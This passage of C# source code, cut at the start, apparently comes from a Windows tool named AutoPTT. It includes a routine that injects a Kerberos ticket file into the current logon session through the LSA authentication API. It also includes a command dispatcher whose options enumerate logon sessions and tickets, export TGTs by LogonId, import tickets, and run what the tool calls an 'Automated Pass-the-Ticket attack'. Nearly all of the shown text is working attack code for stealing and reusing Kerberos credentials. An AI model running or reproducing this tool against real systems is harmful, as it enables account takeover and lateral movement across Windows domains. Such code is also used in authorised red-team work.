            Marshal.Copy(ticketData, 0, new IntPtr(submitPtr.ToInt64() + structSize), fileSize);

            IntPtr responsePtr;
            uint responseSize;
            int protocolStatus;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, submitPtr, (uint)submitSize, 
                out responsePtr, out responseSize, out protocolStatus);

            Marshal.FreeHGlobal(submitPtr);

            if (status != 0 || protocolStatus != 0)
            {
                Console.WriteLine($"\nError: Failed to import ticket");
                Console.WriteLine($"  Status: 0x{status:X8}");
                Console.WriteLine($"  SubStatus: 0x{protocolStatus:X8}");

                if (protocolStatus == unchecked((int)0xC000018B) || protocolStatus == -1073741429)
                    Console.WriteLine("  Reason: Invalid or malformed ticket");
                else if (protocolStatus == unchecked((int)0xC0000225) || protocolStatus == -1073741275)
                    Console.WriteLine("  Reason: Domain not found");
                else if (protocolStatus == unchecked((int)0xC000005E) || protocolStatus == -1073741730)
                    Console.WriteLine("  Reason: No valid logon sessions");
                else if (protocolStatus == unchecked((int)0xC000000D) || protocolStatus == -1073741811)
                    Console.WriteLine("  Reason: Invalid parameter");

                if (responsePtr != IntPtr.Zero)
                    LsaFreeReturnBuffer(responsePtr);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            Console.WriteLine("\n[+] Ticket imported successfully into memory");
            Console.WriteLine($"    File: {filename}");
            Console.WriteLine($"    Size: {fileSize} bytes");
            Console.WriteLine("\n[+] Ticket is now available in Kerberos cache");
            Console.WriteLine($"    You can verify with: AutoPTT.exe klist");

            if (responsePtr != IntPtr.Zero)
                LsaFreeReturnBuffer(responsePtr);
            LsaDeregisterLogonProcess(lsaHandle);
        }


        static void PrintBanner()
        {
            string banner = @"
     ___         __       ___  ____________
    / _ | __ __ / /_ ___ / _ \/_  __/_  __/
   / __ |/ // // __// _ \/ ___/ / /   / /   
  /_/ |_|\_,_/ \__/ \___/_/    /_/   /_/    

  v1.1 - Kerberos Ticket Enumerator (C#)
  sessions, klist, tickets, export, ptt, auto
";
            Console.WriteLine(banner);
        }


        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                string command = args[0].ToLower();

                if (command == "sessions")
                {
                    PrintCurrentLogonId();
                    EnumerateLogonSessions();
                }
                else if (command == "klist")
                {
                    PrintCurrentLogonId();
                    EnumerateMyTickets();
                }
                else if (command == "tickets")
                {
                    PrintCurrentLogonId();
                    EnumerateAllTickets();
                }
                else if (command == "export" && args.Length > 1)
                {
                    ExportTicket(args[1]);
                }
                else if (command == "ptt" && args.Length > 1)
                {
                    PassTheTicket(args[1]);
                }
                else if (command == "auto")
                {
                    AutoExportAndImport();
                }
                else
                {
                    PrintBanner();
                    Console.WriteLine("Usage:");
                    Console.WriteLine($"  AutoPTT.exe auto             - Automated Pass-the-Ticket attack");
                    Console.WriteLine($"  AutoPTT.exe sessions         - List all logon sessions");
                    Console.WriteLine($"  AutoPTT.exe klist            - List tickets in current session");
                    Console.WriteLine($"  AutoPTT.exe tickets          - List all tickets from all sessions");
                    Console.WriteLine($"  AutoPTT.exe export <LogonId> - Export a TGT given the LogonId");
                    Console.WriteLine($"  AutoPTT.exe ptt <file>       - Import a ticket file given the file name");
                    Console.WriteLine();
                }
            }
            else
            {
                PrintBanner();
                Console.WriteLine("Usage:");
                Console.WriteLine($"  AutoPTT.exe auto             - Automated Pass-the-Ticket attack");
                Console.WriteLine($"  AutoPTT.exe sessions         - List all logon sessions");
                Console.WriteLine($"  AutoPTT.exe klist            - List tickets in current session");
                Console.WriteLine($"  AutoPTT.exe tickets          - List all tickets from all sessions");
                Console.WriteLine($"  AutoPTT.exe export <LogonId> - Export a TGT given the LogonId");
                Console.WriteLine($"  AutoPTT.exe ptt <file>       - Import a ticket file given the file name");
                Console.WriteLine();
            }
        }
    }
}